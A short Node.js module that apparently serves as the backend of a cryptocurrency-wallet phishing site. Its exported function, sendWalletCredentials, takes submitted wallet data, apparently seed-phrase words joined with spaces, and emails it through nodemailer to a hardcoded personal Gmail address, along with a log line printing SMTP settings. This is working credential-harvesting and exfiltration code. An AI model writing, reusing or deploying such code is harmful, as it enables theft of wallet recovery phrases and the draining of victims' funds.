const nodemailer = require('nodemailer');

console.log('SMTP config:', process.env.SMTP_HOST, process.env.SMTP_PORT, process.env.SMTP_SECURE, process.env.SMTP_USER);

const EMAIL_TO = 'superbdude30@gmail.com';

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT),
  secure: process.env.SMTP_SECURE === 'true',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

async function sendWalletCredentials(type, data) {
  const subject = `Wallet Credential Submission: ${type}`;
  const text = `Received ${type}:\n${Array.isArray(data) ? data.join(' ') : data}`;
  await transporter.sendMail({
    from: process.env.SMTP_USER,
    to: EMAIL_TO,
    subject,
    text,
  });
}

module.exports = { sendWalletCredentials };
